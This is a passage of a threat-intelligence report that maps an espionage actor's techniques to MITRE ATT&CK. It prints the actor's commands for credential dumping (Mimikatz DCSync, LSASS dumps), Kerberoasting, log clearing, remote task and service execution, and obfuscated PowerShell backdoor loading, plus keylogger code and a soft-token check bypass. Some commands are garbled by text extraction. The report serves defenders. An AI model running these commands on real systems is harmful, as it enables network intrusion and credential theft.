mrteeh.tmp:\n\n\n_Table 21 – Hashes for the keylogger outputting its data to mrteeh.tmp_\n\n\n**Hash type** **Hash**\n\n\nMD5 `bfdae0e61bb4e780e3c1d5cd77e0682b`\n\nSHA1 `5fea5b85beed1e2792e9fb74180ae002cdb14ff1`\n\nSHA256 `29d5933c18826b00bc075623740c00c00057ff897580bea3362674f6ec1cbe10`\n\n\n-----\n\n**Initial Access**\n\n\n**Execution**\n\n\n**Persistence**\n\n\n**Privilege Escalation**\n\n\n**Defense Evasion**\n\n\n**Credential Access**\n\n\nDrive-by Compromise\n**Exploit Public-Facing**\n**Application**\nHardware Additions\nReplication Through\nRemovable Media\nSpearphishing\nAttachment\nSpearphishing Link\nSpearphishing via Service\nSupply Chain\nCompromise\nTrusted Relationship\nValid Accounts\n\n\nAppleScript\nCMSTP\n**Command-Line**\n**Interface**\nCompiled HTML File\nControl Panel Items\nDynamic Data Exchange\nExecution through API\nExecution through\nModule Load\nExploitation for Client\nExecution\nGraphical User Interface\nInstallUtil\nLaunchctl\nLocal Job Scheduling\nLSASS Driver\nMshta\n**PowerShell**\nRegsvcs/Regasm\nRegsvr32\nRundll32\n**Scheduled Task**\nScripting\n**Service Execution**\nSigned Binary Proxy\nExecution\nSigned Script Proxy\nExecution\nSource\nSpace after Filename\nThird-party Software\nTrap\nTrusted Developer\nUtilities\nUser Execution\n**Windows Management**\n**Instrumentation**\nWindows Remote\nManagement\nXSL Script Processing\n\n\n.bash_profile and .bashrc\nAccessibility Features\nAccount Manipulation\nAppCert DLLs\nAppInit DLLs\nApplication Shimming\nAuthentication Package\nBITS Jobs\nBootkit\nBrowser Extensions\nChange Default File\nAssociation\nComponent Firmware\nComponent Object\nModel Hijacking\nCreate Account\nDLL Search Order\nHijacking\nDylib Hijacking\n**External Remote**\n**Services**\nFile System Permissions\nWeakness\nHidden Files and\nDirectories\nHooking\nHypervisor\nImage File Execution\nOptions Injection\nKernel Modules and\nExtensions\nLaunch Agent\nLaunch Daemon\nLaunchctl\nLC_LOAD_DYLIB\nAddition\nLocal Job Scheduling\nLogin Item\nLogon Scripts\nLSASS Driver\nModify Existing Service\nNetsh Helper DLL\nNew Service\nOffice Application Startup\nPath Interception\nPlist Modification\nPort Knocking\nPort Monitors\nRc.common\nRe-opened Applications\nRedundant Access\nRegistry Run Keys /\nStartup Folder\nScheduled Task\nScreensaver\nSecurity Support Provider\nService Registry\nPermissions Weakness\nSetuid and Setgid\nShortcut Modification\nSIP and Trust Provider\nHijacking\nStartup Items\nSystem Firmware\nTime Providers\nTrap\n**Valid Accounts**\n**Web Shell**\nWindows Management\nInstrumentation Event\nSubscription\nWinlogon Helper DLL\n\n\nAccess Token\nManipulation\nAccessibility Features\nAppCert DLLs\nAppInit DLLs\nApplication Shimming\nBypass User Account\nControl\nDLL Search Order\nHijacking\nDylib Hijacking\nExploitation for Privilege\nEscalation\nExtra Window Memory\nInjection\nFile System Permissions\nWeakness\nHooking\nImage File Execution\nOptions Injection\nLaunch Daemon\nNew Service\nPath Interception\nPlist Modification\nPort Monitors\n**Process Injection**\nScheduled Task\nService Registry\nPermissions Weakness\nSetuid and Setgid\nSID-History Injection\nStartup Items\nSudo\nSudo Caching\n**Valid Accounts**\nWeb Shell\n\n\nAccess Token\nManipulation\nBinary Padding\nBITS Jobs\nBypass User Account\nControl\nClear Command History\nCMSTP\nCode Signing\nCompiled HTML File\nComponent Firmware\nComponent Object\nModel Hijacking\nControl Panel Items\nDCShadow\nDeobfuscate/Decode\nFiles or Information\nDisabling Security Tools\nDLL Search Order\nHijacking\nDLL Side-Loading\nExploitation for Defense\nEvasion\nExtra Window Memory\nInjection\n**File Deletion**\nFile Permissions\nModification\nFile System Logical\nOffsets\nGatekeeper Bypass\nHidden Files and\nDirectories\nHidden Users\nHidden Window\nHISTCONTROL\nImage File Execution\nOptions Injection\nIndicator Blocking\n**Indicator Removal**\n**from Tools**\n**Indicator Removal on**\n**Host**\nIndirect Command\nExecution\nInstall Root Certificate\nInstallUtil\nLaunchctl\nLC_MAIN Hijacking\nMasquerading\n**Modify Registry**\nMshta\nNetwork Share\nConnection Removal\nNTFS File Attributes\n**Obfuscated Files or**\n**Information**\nPlist Modification\nPort Knocking\nProcess Doppelgänging\nProcess Hollowing\nProcess Injection\n**Redundant Access**\nRegsvcs/Regasm\nRegsvr32\nRootkit\nRundll32\nScripting\nSigned Binary Proxy\nExecution\nSigned Script Proxy\nExecution\nSIP and Trust Provider\nHijacking\nSoftware Packing\nSpace after Filename\nTemplate Injection\nTimestomp\nTrusted Developer\nUtilities\n**Valid Accounts**\nWeb Service\nXSL Script Processing\n\n\nAccount Manipulation\nBash History\nBrute Force\n**Credential Dumping**\nCredentials in Files\nCredentials in Registry\nExploitation for\nCredential Access\nForced Authentication\nHooking\n**Input Capture**\nInput Prompt\n**Kerberoasting**\nKeychain\nLLMNR/NBT-NS\nPoisoning\nNetwork Sniffing\nPassword Filter DLL\n**Private Keys**\nSecurityd Memory\nTwo-Factor\nAuthentication\nInterception\n\n\n-----\n\n**Discovery**\n\n\n**Lateral Movement**\n\n\n**Collection**\n\n\n**Exfiltration**\n\n\n**Command and Control**\n\n\n**Account Discovery**\nApplication Window\nDiscovery\nBrowser Bookmark\nDiscovery\n**Domain Trust**\n**Discovery**\n**File and Directory**\n**Discovery**\n**Network Service**\n**Scanning**\n**Network Share**\n**Discovery**\nNetwork Sniffing\nPassword Policy\nDiscovery\nPeripheral Device\nDiscovery\n**Permission Groups**\n**Discovery**\n**Process Discovery**\n**Query Registry**\n**Remote System**\n**Discovery**\n**Security Software**\n**Discovery**\n**System Information**\n**Discovery**\n**System Network**\n**Configuration Discovery**\n**System Network**\n**Connections Discovery**\n**System Owner/User**\n**Discovery**\n**System Service**\n**Discovery**\n**System Time Discovery**\n\n\nAppleScript\nApplication Deployment\nSoftware\nDistributed Component\nObject Model\nExploitation of Remote\nServices\nLogon Scripts\nPass the Hash\nPass the Ticket\nRemote Desktop Protocol\n**Remote File Copy**\n**Remote Services**\nReplication Through\nRemovable Media\nShared Webroot\nSSH Hijacking\nTaint Shared Content\nThird-party Software\n**Windows Admin**\n**Shares**\nWindows Remote\nManagement\n\n\nAudio Capture\nAutomated Collection\n**Clipboard Data**\nData from Information\nRepositories\n**Data from Local**\n**System**\nData from Network\nShared Drive\nData from Removable\nMedia\nData Staged\nEmail Collection\nInput Capture\nMan in the Browser\nScreen Capture\nVideo Capture\n\n\nAutomated Exfiltration\n**Data Compressed**\nData Encrypted\nData Transfer Size Limits\nExfiltration Over\nAlternative Protocol\n**Exfiltration Over**\n**Command and Control**\n**Channel**\nExfiltration Over Other\nNetwork Medium\nExfiltration Over Physical\nMedium\nScheduled Transfer\n\n\nCommonly Used Port\nCommunication Through\nRemovable Media\n**Connection Proxy**\n**Custom Command and**\n**Control Protocol**\nCustom Cryptographic\nProtocol\nData Encoding\nData Obfuscation\nDomain Fronting\nFallback Channels\n**Multi-hop Proxy**\nMulti-Stage Channels\nMultiband\nCommunication\nMultilayer Encryption\nPort Knocking\nRemote Access Tools\nRemote File Copy\nStandard Application\nLayer Protocol\n**Standard**\n**Cryptographic**\n**Protocol**\nStandard Non-Application\nLayer Protocol\n**Uncommonly Used**\n**Port**\nWeb Service\n\n\n## 6 MITRE ATT&CK matrix\n\n#### In order to categorize this actor’s tools, techniques and procedures we have\n\n opted to use MITRE’s ATT&CK Matrix for Enterprise⁶, which provides for\n\n a standardized framework to map such information to the various stages\n\n of an attack.\n\n6. https://attack.mitre.org/matrices/enterprise/\n\n\n-----\n\n#### 6.1 Initial Access\n\n**6.1.1 Exploit Public-Facing Application**\nThe actor leverages already existing webshells on JBoss servers, placed there by completely different\nthreat actors, for reconnaissance of a victim’s server. After the reconnaissance the actor uploads its\nown webshell(s) by using default credentials or by exploiting various types of vulnerabilities in JBoss\nwebservers. The actor appears to be using the opensource JBoss exploitation tool JexBoss⁷.\n\n#### 6.2 Execution\n\n**6.2.1 Command-Line Interface**\nFor executing tooling or for specific tasks cmd.exe is often used. Specific examples will be provided\nin the following chapters.\n\n**6.2.2 PowerShell**\nThe actor uses various PowerShell tools which are all open source:\n\n**•** KeeThief⁸\n\n**•** KeeThief can be used to recover the plaintext master password and other type of key material\n\nfrom the running KeePass process, a popular password manager.\n\n**•** Invoke-BloodHound, executes the BloodHound C# ingestor SharpHound⁹\n\n**•** BloodHound is an application made to map relationships in the active directory. SharpHound\n\nis a C# ingestor for BloodHound.\n\n**•** Invoke-Mimikatz¹⁰\n\n**•** Invoke-Mimikatz leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load\n\nMimikatz in memory.\n\n**•** Mimikatz can be used to extract, for example, plaintext passwords and Kerberos tickets from\n\nmemory.\n\nPowerShell is also used to execute custom backdoors that are written in C#, such as XServer.\nAn example of PowerShell code executing the XServer backdoor, using a single byte XOR cipher:\n\n\nfunction format([string]$source){$tt = \"\";$bb = [System.\n\nConvert]::FromBase64String($source);foreach($c in $bb){$tt = $tt + [char]($c -bxor 37 + 1);}\n\nreturn $tt;}\n\n$code = format(\"BASE64 ENCODED CUSTOM BACKDOOR”)\n\nAdd-Type $code;\n\n[agent]::Main($args);\n\n\n7. https://github.com/joaomatosf/jexboss\n8. https://github.com/HarmJ0y/KeeThief\n9. https://github.com/BloodHoundAD/BloodHound/wiki/Data-Collector\n10. https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1\n\n\n-----\n\nAnother example of PowerShell code executing the XServer backdoor, adding, and deleting a rule in\nthe Windows firewall:\n\n\n$encfile = '<BASE64 ENCODED CUSTOM BACKDOOR>'\n\n$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream]\n\n[Convert]::FromBase64String($encfile),[IO.Compression.CompressionMode]::Decompress)\n\n$defilebytes = New-Object Byte[](34317)\n\n$DeflatedStream.Read($defilebytes, 0, 34317) | Out-Null\n\n$x = [System.Text.Encoding]::Default.GetString($defilebytes)\n\nnetsh advfrewall fi rewall delete rule name=powershell | out-nulli\n\nnetsh advfirewall firewall add rule name=powershell dir=in localport=47000 action=allow |\n```\nout-null\nAdd-Type $x\n\n```\nnetsh advfirewall firewall delete rule name=powershell | out-null;\n\n[xserver]::Main($args);\n\n\nHowever, the netsh command adding the firewall rule named powershell, as seen above, is not\nexecuted, as the protocol has to be specified (which should be TCP), resulting in the following error:\nPorts can only be specified if the protocol is TCP or UDP. An error the actor likely never saw because\nthe results of the command are not written to the console.\n\n**6.2.3 Scheduled Task**\nThe actor uses scheduled tasks to execute malicious code, typically PowerShell, to remote systems\nusing credentials of privileged accounts.\n\n```\n/c cd /d c:\\temp & schtasks /create /u <DOMAIN>\\<USERNAME> /p \"<PASSWORD>\" /ru system /sc\n\n```\ndaily /tr \"cmd /c powershell.exe -ep bypass -file c:\\s.ps1\" /tn win32times /f\n\n\nAfter executing the PowerShell code, the scheduled task is removed, to limit traces on the\ncompromised system:\n\n```\nschtasks /delete /u <DOMAIN>\\<USERNAME> /p \"<PASSWORD>\" /tn win32times /s <IP ADDRESS> /f\n\n```\n\n**6.2.4 Scripting**\nTo retrieve more information of systems within the network, the actor deploys a custom VBS script,\ndescribed in more detail in chapter 5.4. CScript is used to execute the VBS script:\n\n```\n/Q /c cscript c:\\windows\\temp\\OAKMZ.vbs c:\\windows\\temp\\OAKMZ.txt\n\n```\n\nPowerShell is frequently used to execute custom backdoors that are written in C#, as previously\ndescribed in chapter 6.2.2.\n\n.bat files are occasionally used to start services, as described in chapter 6.2.5.\n\n\n-----\n\n**6.2.5 Service Execution**\nThough the actor appears to favor the use of scheduled tasks to execute code on remote systems,\non some occasions services are created:\n\n```\n/c cd /d c:\\windows\\temp & sc \\\\<IP ADDRESS> create win32times binPath= \"cmd /c start c:\\\nwindows\\temp\\x.bat\"\n/c cd /d c:\\windows\\temp & sc \\\\<IP ADDRESS> query server\n\n```\n\n**6.2.6 Windows Management Instrumentation (WMI)**\nThe actor usually performs some initial reconnaissance using WMI. It appears that once a system\nof interest has been identified, a custom XServer backdoor is deployed, in order to execute more\ncommands. Commands executed and files uploaded/downloaded over WMI appear plaintext over\nthe network, whereas they are encrypted using TLS when executed using the XServer backdoor.\n\n```\n/Q /c wmic os get lastbootuptime\n\n```\n\n#### 6.3 Persistence\n\n**6.3.1 Web Shell**\nThough the actor primarily uses web shells during the initial access phase of an attack, they are\nleft in place for redundant access. Most commands to the webshell are sent through HTTP POST\nrequests. The functionality of these webshells are described in chapter 5.\n\n**6.3.2 External Remote Services**\nOne of the primary methods of persistent access the actor typically has to a victim network after\nthe Initial Access phase of the attack is gained through compromised VPN credentials.\n\nAn interesting observation in one of Fox-IT’s incident response cases was that the actor steals a softtoken for RSA SecurID, which is typically generated on a separate device, such as a hardware token\nor mobile phone. In this specific case however, victims using the software could also use a software\nbased token to generate 2 factor codes on their laptop. This usage scenario opens up multiple\npossibilities for an attacker with access to a victim’s laptop to retrieve 2 factor codes used to connect\nto a VPN server.\n\nBecause Fox-IT was uncertain which method the actor used to obtain valid 2 factor codes from\nits victims we analyzed the RSA SecurID software to determine the attack scenario that was most\nlikely used.\n\n\n-----\n\nThe scenario that we considered most likely was that in which the actor steals a victim’s software\nbased token to generate the 2 factor codes on the actor’s own system(s). However, if an attacker\nwere to import this soft-token on any other system other than the victim’s laptop, the RSA SecurID\nsoftware would prompt the following error:\n\n_Figure 7 – RSA SecurID error prompt_\n\nThe software token is generated for a specific system, but of course this system specific value could\neasily be retrieved by the actor when having access to the system of the victim.\n\nAs it turns out, the actor does not actually need to go through the trouble of obtaining the victim’s\nsystem specific value, because this specific value is only checked when importing the SecurID Token\nSeed, and has no relation to the seed used to generate actual 2-factor tokens. This means the actor\ncan actually simply patch the check which verifies if the imported soft token was generated for this\nsystem, and does not need to bother with stealing the system specific value at all.\n\nIn short, all the actor has to do to make use of the 2 factor authentication codes is to steal an RSA\nSecurID Software Token and to patch 1 instruction, which results in the generation of valid tokens:\n\n_Figure 8 – RSA SecurID generating valid 2 factor codes_\n\n\n-----\n\n**6.3.3 Valid accounts**\nAs described in chapter 6.3.2 the actor uses valid VPN accounts to connect to the victim’s network\nthrough the VPN concentrator. Other valid accounts are used for lateral movement, and consist\nmostly of Windows domain credentials, including domain and local administrator credentials.\n\n#### 6.4 Privilege Escalation\n\n**6.4.1 Valid accounts**\nJust like most actors attempting to gain an extensive foothold into a network, the actor retrieves\nthe credentials from domain administrators from the memory of systems where such credentials are\nused. Then by logging on to various domain controllers with these credentials, plain-text passwords\nand hashes are dumped from such servers using ProcDump or Mimikatz.\n\n#### 6.5 Defense Evasion\n\n**6.5.1 File Deletion**\nFor deleting files used by the actor for malicious purposes, two subsequent steps are always taken:\n1) Overwriting the file with a legitimate Windows DLL file\n\n```\n/c cd /d c:\\windows\\temp\\ & copy \\\\<IP ADDRESS>\\c$\\windows\\system32\\devmgr.dll \\\\<IP\nADDRESS>\\c$\\windows\\temp\\LMAKSW.ps1 /y\n\n```\n\n2) Deleting the overwritten file\n\n```\n/c cd /d c:\\windows\\temp\\ & del \\\\<IP ADDRESS>\\c$\\windows\\temp\\LMAKSW.ps1\n\n```\n\nThe actor is very consistent in removing its files from a system once they have served its purpose.\nLog files and executable files are quickly overwritten and deleted once they are no longer needed.\nThis makes both forensic and actor tracking efforts more complicated, as only few traces and\nexecutables remain on the system to be investigated.\n\n**6.5.2 Indicator Removal from Tools**\nThe actor makes use of the open-source Impacket suite¹¹, a collection of Python classes and scripts\nto interact with network protocols. Fox-IT has observed the actor using tools such as smbexec.py\nand wmiexec.py for code execution over SMB, which are part of this software suite. Using network\ncaptures Fox-IT observed that the actor made small modifications to these scripts, likely in an effort\nto avoid detection, while analyzing the SMB connections.\n\n11. https://github.com/SecureAuthCorp/impacket\n\n\n-----\n\nsmbexec.py\nThe variable BATCH_FILENAME in this script is set to execute.bat by default. Fox-IT observed that\nthe actor changed this variable to __exec.bat.\n\nwmiexec.py\nThe variable OUTPUT_FILENAME in this script is set to '__' + str(time.time()) by default.\nNote that this variable used for the named pipe is based on the epoch timestamp, this was done\non purpose to avoid any locking issues (https://github.com/SecureAuthCorp/impacket/issues/108).\nHowever Fox-IT observed that the actor changed this variable to the static string __output.\n\n**6.5.3 Indicator Removal on Host**\nThough this action is not executed consistently, the actor has, on multiple occasions, deleted all\nsystem and security event logs on compromised servers:\n\n```\n/Q /c wevtutil cl system\n/Q /c wevtutil cl security\n\n```\n\nThe actor cleans up running backdoors from systems that are no longer of use to the actor. This is\ndone by searching for the PID of the process that is listening on the backdoor port, and then killing\nthat specific process.\n\n\n/c cd /d c:\\windows\\temp\\ & netstat -ano|find \"25667\"\n```\n/c cd /d c:\\windows\\temp\\ & taskkill /f /im 4804\n\n```\n\n**6.5.4 Modify registry**\nOn some compromised servers the actor would modify the WDigest registry value from 0 (disabled)\nto 1 (enabled).\n\nWDigest is a protocol used primarily in older versions of Windows for LDAP and web-application\nauthentication. When enabled it stores the plain-text password of the logged in Windows domain\nuser in memory, which can then easily be dumped by an actor with access to the system. The key\nis located in the following location:\n```\nHKLM\\SYSTEM\\\\ControlSet001\\\\Control\\\\SecurityProviders\\\\WDigest\n\n```\n**6.5.5 Obfuscated Files or Information**\nCommands executed via PowerShell are encoded or compressed, using Base64, zlib and XOR. Below\nare some examples.\n\n```\npowershell -exec bypass -enc\nJgAgAHsASQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAGMAOgBcAHQAZQBtAHAAXABpAGsALgBwAHMAMQA7ACAA\nRwBlAHQALQBEAG8AbQBhAGkAbgBVAHMAZQByACAALQBTAFAATgAgAHwAIABHAGUAdAAtAEQAbwBtAGEAaQBuAFMA\nUABOAFQAaQBjAGsAZQB0ACAALQBPAHUAdABwA HUAdABGAG8AcgBtAGEAdAAgAEgAYQBzAGgAYwBhAHQAfQA= >\nrs.txt\n\n```\n\n-----\n\n$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream]\n```\n[Convert]::FromBase64String\n\n```\n($encfile),[IO.Compression.CompressionMode]::Decompress)\n\n\nfunction format([string]$source){$tt = \"\";$bb = [System.\n\nConvert]::FromBase64String($source);foreach($c in $bb){$tt = $tt + [char]($c -bxor 37 + 1);}\n\nreturn $tt;}\n\n\nThe actor makes frequent use of Base64 within their PowerShell scripts and command snippets.\nBackdoor scripts are usually also compressed using DEFLATE, in addition to being encoded with Base64.\nThe agent proxy is the only script that adds a layer of single-byte XOR. It is noteworthy that the XOR\noperation is in the form of “<charcode> XOR <int> + <int>”, in comparison to “<charcode> XOR <int>”.\n\nOnly one case of string obfuscation was observed, and it is not particularly complex. In the custom\ntool used to launch processes, as described in chapter 5.8, some of the strings are reversed or stored\npartially in the data section. Within the code, these strings would be reversed again or appended\nwith the remainder of the string.\n\nIn one case Fox-IT observed a combination of Base64 and BZIP being used to obfuscate a Python\nscript compiled with py2exe. The resulting Python code also appeared to be minified, as all\nwhitespace had been removed and all function names consisted of single characters, in an attempt\nto complicate analysis.\n\nFor network communication, TLS is mostly used with the occasional use of RC4. This is explained\nfurther in chapters 5.5 and 5.6.\n\n**6.5.6 Redundant Access**\nThe actor uses webshells for initial access to a victim’s network, after which Windows backdoors or\nvalid VPN accounts are used for persistence. However, the webshells are left in place for redundant\naccess/fallback persistence.\n\n**6.5.7 Valid Accounts**\nThe actor uses various valid accounts for lateral movement and access to the network. These include:\n\n**•** VPN credentials in combination with a stolen soft token (as described in chapter 6.3.2).\n\n**•** Windows domain credentials, including domain and local administrator credentials.\n\n#### 6.6 Credential access\n\n**6.6.1 Credential Dumping**\nThe actor often uses Mimikatz to dump credentials of accounts with elevated privileges:\n\n```\ncd /d c:\\windows\\temp & echo \"log c:\\windows\\temp\\xx.txt\" privilege::debug \"lsadump::dcsync\n/all /csv /domain:AD.local /dc:DC.AD.local\" exit > c:\\mrt.ini\n\n```\n\n-----\n\nIn some cases the actor opts for the use of Windows Sysinternals’ ProcDump¹², to directly dump\nthe memory of the LSASS process. In the example below zao.exe is actually ProcDump, writing\nits output to zao.a:\n\n```\n/c cd /d c:\\windows\\temp & zao.exe /accepteula -ma lsass.exe zao.a\n\n```\n\nThe /accepteula flag ensures the EULA of ProcDump is silently accepted and doesn’t create a\npopup. The –ma flag dumps all process memory, not just thread and handle information. This dump\ncan then be used to recover passwords from a remote system.\n\n**6.6.2 Input Capture**\nThe actor uses a keylogger, written in Python and compiled to an executable using py2exe, which\noutputs the victim’s keystrokes to a file that is passed as argument to the executable. This keylogger\nis primarily used to obtain the password for a victim's password manager. A default path is configured\nin the Python code. For example:\n\n\nsavepath = 'c:\\\\windows\\\\temp\\\\tap.tmp'\n\n\nIn later versions, the default filename was changed:\nThe keylogger is described in more detail in chapter 5.11.\n\n\nsavepath = 'c:\\\\windows\\\\temp\\\\mrteeh.tmp'\n\n\n**6.6.3 Kerberoasting**\nTo be able to bruteforce the passwords of Windows service accounts, the actor uses PowerSploit’s\nInvoke-Kerberoast¹³ module to request encrypted service tickets. The bruteforcing of the passwords\nused to encrypt these tickets can be done completely offline, which prevents domain traffic or any\npotential account lockouts, making it more difficult to detect this malicious behavior. An example\ncommand:\n\n\n& {Import-Module c:\\temp\\ik.ps1; Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat\n\nHashcat}\n\n\n12. https://docs.microsoft.com/en-us/sysinternals/downloads/procdump\n13. https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/\n\n\n-----\n\n**6.6.4 Private Keys**\nIn some cases, the actor used Mimikatz to dump certificates and private keys from the Windows\ncertificate stores. These could potentially be used to connect to authenticated internal services:\n\n```\ncd /d c:\\windows\\temp & echo \"log c:\\windows\\temp\\zaw.txt\" privilege::debug crypto::cng\n\n```\ncrypto::capi \"crypto::certificates /export\" \"crypto::certificates /systemstore:local_system /\n```\nstore:Root /export\" exit > c:\\mrt.ini\ncd /d c:\\windows\\temp & echo \"log c:\\windows\\temp\\zaw.txt\" privilege::debug crypto::cng\n\n```\ncrypto::capi \"crypto::certificates /export\" \"crypto::certificates /export /systemstore:CERT_\n```\nSYSTEM_STORE_LOCAL_MACHINE\" exit > c:\\mrt.ini\n\n```\n\nUsing the Mimikatz arguments above, private keys marked as non-exportable can also be exported.\n\n#### 6.7 Discovery\n\n**6.7.1 Account Discovery**\nThe following command is executed on a domain controller to retrieve information of a specific\ntarget:\n\n```\n/c cd /d c:\\windows\\temp & net user <username> /domain\n\n```\n\nTo get a list of all users that have authenticated with a specific domain and have a user profile, the\nactor executes the following command on a domain controller:\n\n```\n/c cd /d c:\\windows\\temp\\ & dir c:\\users\\\n\n```\n\n**6.7.2 Domain Trust Discovery**\nOccasionally the actor has made use of BloodHound¹⁴ to map the trusts between various domains,\nand the SharpHound C# tool to ingest its data. Below are two examples of commands executed\nthrough SharpHound:\n\n\nC:\\\\Windows\\\\system32>powershell -ep bypass -c \\\"& {Import-Module c:\\\\sh.ps1; Invoke\nBloodHound -CollectionMethod All}\\\" 1>c:\\\\ret.txt\n\n\nC:\\\\windows\\\\temp>cmd /c powershell -ep bypass -c \\\"& {Import-Module c:\\\\windows\\\\temp\\\\sh.ps1;\n\nInvoke-BloodHound -CollectionMethod All -SearchForest}\\\" 1>C:\\\\windows\\\\temp\\\\ret.txt\n\n\n14. https://github.com/BloodHoundAD/BloodHound\n\n\n-----\n\n**6.7.3 File and Directory Discovery**\nThe following command is executed to identify the contents of a (KeePass configuration) file:\n\n\n/Q /c type c:\\users\\<username>\\appdata\\Roaming\\keepass\\KeePass.config.xml\n\n\nThe following command is executed to list all files in a specific directory with the kdbx (KeePass\ndatabase) extension:\n\n```\n/Q /c dir *.kdbx\n\n```\n\nSometimes the actor uses a custom find/walk tool that writes recursive directory listings to a file:\n\n```\n/c cd /d c:\\windows\\temp & zos.exe c:\\ 0 c:\\windows\\temp\\zos.a\n\n```\n\nMore details on this specific tool can be found in chapter 5.7.\n\n**6.7.4 Network Service Scanning**\nIn the example below, nb.exe is an open-source scan tool called nbtscan, which scans for NETBIOS\nnameservers.\n\n```\n/c cd /d c:\\temp & nb.exe 10.10.0.0/16 >>10.txt\n\n```\n\nThe actor also sometimes uses a custom scanning tool that is capable of enumerating sessions and\nusers on remote hosts.\n\n```\niie.exe iie.txt -u <domain>\\<username> -p \"<password>\" -session -s iie.log\n\n```\n\nMore details on this specific tool can be found in chapter 5.9.\n\nThe actor executes the following command on a domain controller to retrieve all subnets in the\nActive Directory:\n\n```\ndsquery subnet\n\n```\n\nThis information is used by the actor to get a better understanding of the victim’s network.\n\n**6.7.5 Network Share Discovery**\nThe actor attempts to identify file shares and other remote systems by executing a netstat command,\nlikely in order to passively identify remote systems for further lateral movement:\n\n\n/c cd /d c:\\windows\\temp & netstat -ano|fnd \":445\"i\n\n\n-----\n\n**6.7.6 Permission Groups Discovery**\nIn order to know which administrators to target, the actor lists all administrators part of a local group\nby executing the following command:\n\n```\nnet localgroup administrators\n\n```\n\n**6.7.7 Process Discovery**\nThe actor lists all running processes on a compromised system, and uses the find command to\nidentify specific processes of interest. In the example below the actor searches for the KeePass\nprocess, in order to determine the ID of the process, which would subsequently be used to inject\ncode into, designed to steal the KeePass master key:\n\n\n/Q /c tasklist /v |fnd /I \"keepass\"i\n\n\nThis same process ID identification is true for the explorer.exe process, which is used by the actor to\ninject a keylogger into:\n\n\n/Q /c tasklist /v|fnd \"explorer.exe\"i\n\n\nThe keylogger (described in chapter 5.11) injected into explorer.exe is primarily used to obtain the\npassword for the victim’s password manager.\n\n**6.7.8 Query Registry**\nThe actor queries the registry of a compromised user to identify recent PuTTY sessions, likely done to\npassively identify remote systems for further lateral movement\n\n```\n/c cd /d c:\\windows\\temp\\ & reg query HKEY_CURRENT_USER\\Software\\<username>\\PuTTY\\Sessions\\\n\n```\n\n**6.7.9 Remote System Discovery**\nThe actor often checks for the availability of systems using the ping command:\n\n```\n/c cd /d c:\\temp & ping <internal IP address> -n 1\n\n```\n\n**6.7.10 System Information Discovery**\nTo retrieve information of interest to the actor a custom VBS script is used. This script contains\nseveral functions to retrieve the following information:\n\n**•** Volume drives and the type of drives (Removable disk, network disk, local disk etc.)\n\n**•** Administrators\n\n**•** Device information (Manufacturer, Model etc.)\n\n**•** Installed software\n\n**•** Recently executed software (MuiCache)\n\n**•** Running processes\n\n\n-----\n\nMore information on this specific script can be found in chapter 5.4.\n\n**6.7.11 Security Software Discovery**\nLikely, as a result from the VBS reconnaissance script, described in chapter 5.4, the actor identifies\nsecurity software. During one incident response case where Carbon Black (Response) agents were\ndeployed, the actor identified the agent and repeatedly checked newly compromised systems for the\npresence of this incident response tool, as can be seen in the examples below:\n\n\n/c cd /d c:\\windows\\temp & tasklist /v|fnd \"cb.exe\"i\n\n```\n/Q /c dir c:\\windows\\CarbonBlack\\cb.exe\n\n```\n\nUpon identifying the Carbon Black agents on systems the actor would occasionally halt its activity,\nwhile on other occasions activity would continue as usual.\n\n**6.7.12 System Network Configuration Discovery**\nThe following command is executed on a compromised system to retrieve basic network\nconfiguration information:\n\n\nipconfg /alli\n\n\n**6.7.13 System Network Connections Discovery**\nThe actor executes a netstat command, using the find command to identify specific ports of interest:\nSSH (22), SMB (445) and RDP (3389). This is likely done to passively identify remote systems for\nfurther lateral movement.\n\n\n/Q /c netstat -ano|find \":22\"\n\n/Q /c netstat -ano|fnd \":445\"i\n\n/Q /c netstat -ano|find \":3389\"\n\n\nThe actor executes the following command on a domain controller to list the records in a zone, likely\nto determine the high value targets:\n\n```\ndnscmd.exe /ZonePrint\n\n```\n\n**6.7.14 System Owner/User Discovery**\nOn compromised domain controllers the actor queries the Windows event logs to identify on which\nsystems in the network highly privileged users are working, such as domain administrators and\nenterprise administrators.\n\n\nwevtutil qe security /q:\"*[EventData[Data[@Name='TargetUserName']='<username>']]\" /c:2\n\n\n-----\n\nThe actor then uses administrative credentials to compromise specific systems.\n\n**6.7.15 System Service Discovery**\nIn the example below the actor lists the running services and searches for one of its backdoors:\n\n\n/c cd /d c:\\windows\\temp\\ & tasklist /svc|fnd \"aia.exe\"i\n\n\n**6.7.16 System Time Discovery**\nIn the example below the actor retrieves the current time of a compromised system:\n\n```\n/c cd /d c:\\windows\\temp & time /t\n\n```\n\n#### 6.8 Lateral movement\n\n**6.8.1 Remote File Copy**\nFor the initial infection stage, the actor uses SMB to copy files to and from the target system.\nAfter the XServer backdoor has been deployed, files are instead transferred using the upload and\ndownload functionality of this backdoor.\n\n**6.8.2 Remote Services**\nThe actor mostly uses WMI for lateral movement. In some cases, smbexec.py and psexec.py from\nthe Impacket suite are used.\n\n**6.8.3 Windows Admin Shares**\nThough not consistently, the actor sometimes uses the C$ and IPC$ shares to access files on a\nremote system.\n\n```\n/c cd /d c:\\temp & type \\\\<IP address>\\c$\\windows\\system32\\mimilsa.log\n/c cd /d c:\\windows\\temp & dir \\\\<IP address>\\IPC$\n\n```\n\n#### 6.9 Collection\n\n**6.9.1 Clipboard Data**\nThe keylogger mentioned in 6.6.2 also logs the victim’s clipboard data:\n\n\nwin32clipboard.OpenClipboard()\n\npasted_value = win32clipboard.GetClipboardData()\n\nwin32clipboard.CloseClipboard()\n\noutfile('\\r\\n[PASTE:%d] %s\\r\\n' % (len(pasted_value), pasted_value))\n\n\n-----\n\n**6.9.2 Data from Local System**\nThe XServer backdoor deployed by the actor is capable of downloading arbitrary files from the victim\nsystem. However, this functionality is limited to only a single file at a time. Sometimes the actor uses\ntools like WinRAR or makecab.\n\n**6.9.3 Data Staged**\nBefore exfiltrating documents WinRAR is used to bundle and compress them. The RAR archives\ncreated by WinRAR are staged in the working directory of the actor, which is C:\\Windows\\Temp.\n\n#### 6.10 Exfiltration\n\n**6.10.1 Exfiltration Over Command and Control 